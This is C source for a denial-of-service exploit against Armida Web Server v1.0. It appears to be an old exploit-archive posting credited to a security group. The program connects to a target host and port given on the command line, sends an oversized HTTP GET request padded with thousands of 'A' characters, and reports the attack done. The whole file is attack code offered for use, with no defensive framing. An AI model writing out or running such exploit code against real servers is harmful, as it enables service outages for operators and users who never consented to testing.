/**************************************************************
*
*     Denial of Service Attack against Armida Web Server v1.0
*    *    Tripbit Security Development
*    ----------------------------
*
*    Author: posidron
*
*    Contact
*    [-] Mail: posidron@tripbit.org
*    [-] Web: http://www.tripbit.org
*    [-] Forum: http://www.tripbit.org/wbboard
*    [-] IRC: irc.euirc.net 6667 #tripbit
*
*    Greets: #csec, #securecrew, #tripbit
*
**************************************************************/

#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main(int argc, char *argv[])
{
    int port, sockfd;
    struct sockaddr_in server;
    struct hostent *host;
       char send[6915], flood[6900];
    char get[3] = "GET", http[12] = "HTTP/1.0\n\n";
       memset(flood, 'A', 6900);
       strcpy(send, get);
    strcat(send, flood);
    strcat(send, http);

    if(argc < 3)
    {
        printf("Usage: %s [target] <port>\n", argv[0]);
        exit(0);
    }

    port = atoi(argv[2]);

    host = gethostbyname(argv[1]);
    if(host == NULL)
    {
        printf("Connection failed!...\n");
        exit(0);
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr((char*)argv[1]);

    printf("DoS against Armida v1.0\n");

    if( (sockfd = socket(AF_INET,SOCK_STREAM,0)) < 0)
    {
        printf("Can't start socket()!\n");
        exit(0);
    }
       if(connect(sockfd,(struct sockaddr*)&server,sizeof(server)) < 0)
    {
        printf("Can't connect!\n");
        exit(0);
    }
       write(sockfd, send, strlen(send));
       printf("Attack done!...\n");
       close(sockfd);
}
